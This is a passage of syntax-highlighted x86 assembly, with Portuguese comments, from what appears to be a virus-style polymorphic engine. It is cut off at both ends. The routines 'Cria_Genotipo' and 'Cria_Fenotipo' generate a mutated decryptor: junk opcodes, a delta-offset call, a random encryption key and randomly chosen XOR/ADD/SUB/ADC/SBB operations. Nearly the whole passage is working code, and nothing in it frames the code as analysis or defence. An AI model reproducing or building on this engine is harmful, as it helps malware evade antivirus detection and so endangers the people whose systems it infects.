</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">    </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc5">Cria_Genotipo</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ---- Cria codigo polimorfico ----</span><span class="sc0">

</span><span class="sc5">Cria_Fenotipo</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">; Entrada:</span><span class="sc0">
</span><span class="sc1">; EAX = Buffer</span><span class="sc0">
</span><span class="sc1">; EBX = Genótipo</span><span class="sc0">
</span><span class="sc1">; Saida:</span><span class="sc0">
</span><span class="sc1">; EAX = Inicio do codigo mutado</span><span class="sc0">
</span><span class="sc1">; EDI = Fim do codigo mutado</span><span class="sc0">
</span><span class="sc1">; EBX = Genótipo</span><span class="sc0">
</span><span class="sc1">; EDX = Chave de criptografia</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Salva EAX</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; EDI = EAX</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0609Ch</span><span class="sc0">   </span><span class="sc1">; " PUSHFD / PUSHAD "</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; EAX = EBX</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">; ECX = 2</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">@prox1</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@prox0</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@inicio_poly</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">09C90h</span><span class="sc0">   </span><span class="sc1">; " NOP / PUSHFD "</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@prox0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@trash</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F9h</span><span class="sc4">,</span><span class="sc2">09Eh</span><span class="sc0">

</span><span class="sc5">@trash</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">          </span><span class="sc1">; ESI = Ponteiro para tabela de opcodes trash</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">060h</span><span class="sc0">      </span><span class="sc1">; " PUSHAD " + trash</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@prox1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc0">      </span><span class="sc1">; " MOV ECX, n_Comp "</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">n_Comp</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; ESI = EBX</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@mod_ecx</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@no_mod</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@mod_ecx</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; EDI - 4</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seed</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; ECX = Rand</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">n_Comp</span><span class="sc0">   </span><span class="sc1">; EAX = n_Comp</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">@add_ou_sub</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@xor_ou_or</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@or_</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@xor_</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">;  " MOV ECX,xx / XOR ECX,yy "</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F181h</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@prox2</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@or_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;  " MOV ECX,0 / OR ECX,n_Comp "</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C981h</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@prox2</span><span class="sc0">

</span><span class="sc5">@add_ou_sub</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@sub_</span><span class="sc0">

</span><span class="sc5">@add_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">;  " MOV ECX,xx / ADD ECX,yy "</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0C181h</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@prox2</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@sub_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">;  " MOV ECX,xx / SUB ECX,yy "</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0E981h</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@prox2</span><span class="sc0">

</span><span class="sc5">@no_mod</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">090F8FCFDh</span><span class="sc0">  </span><span class="sc1">;  TRASH</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F990h</span><span class="sc0">       </span><span class="sc1">;  TRASH</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@prox2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;  " MOV EAX,chave "</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seed</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;  " CALL @delta "</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">;  " TRASH / TRASH " (ou não...)</span><span class="sc0">
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">@prox3</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@trash_loop</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@trash_loop</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@prox3</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@edx_ou_edi</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@esi_ou_ebx</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@ebx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@esi</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05Eh</span><span class="sc0">         </span><span class="sc1">;  " POP ESI "</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@escreve0</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@ebx</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05Bh</span><span class="sc0">         </span><span class="sc1">;  " POP EBX "</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@escreve0</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@edx_ou_edi</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@edx</span><span class="sc0">

</span><span class="sc5">@edi</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05Fh</span><span class="sc0">         </span><span class="sc1">;  " POP EDI "</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@escreve0</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@edx</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05Ah</span><span class="sc0">         </span><span class="sc1">;  " POP EDX "</span><span class="sc0">

</span><span class="sc5">@escreve0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Precisaremos saber disso futuramente...</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">          </span><span class="sc1">; (hehe, um truquezinho :P)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;  " ADD (DELTA-REG),(DISTANCIA)-1 "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pushfd</span><span class="sc0">              </span><span class="sc1">; Precisaremos saber futuramente...</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">@prox4</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">037h</span><span class="sc0">         </span><span class="sc1">;  " AAA "</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@prox4</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C133h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;  " XOR EAX,ECX "</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">@rcl_</span><span class="sc0">           </span><span class="sc1">;  " RCL EAX,val "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0D8h</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@val</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@rcl_</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc0">         </span><span class="sc1">;  " RCR EAX,val "</span><span class="sc0">
</span><span class="sc5">@val</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">@nao_eh_xor</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@escreve1</span><span class="sc0">       </span><span class="sc1">;  " XOR "</span><span class="sc0">

</span><span class="sc5">@nao_eh_xor</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@ADC_ou_SBB</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@ADD_ou_SUB</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@2_sub</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@2_add</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;  " ADD "</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@escreve1</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@2_sub</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">         </span><span class="sc1">;  " SUB "</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@escreve1</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@ADC_ou_SBB</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@sbb_</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@adc_</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc0">         </span><span class="sc1">;  " ADC "</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@escreve1</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@sbb_</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;  " SBB "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">018h</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@escreve1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@prox_op</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;  ( POP (REG) é mais rápido do que POPFD )</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05Ah</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@2_edx</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@2_ebx</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@2_esi</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">@2_edi</span><span class="sc4">:</span><span class="sc0">
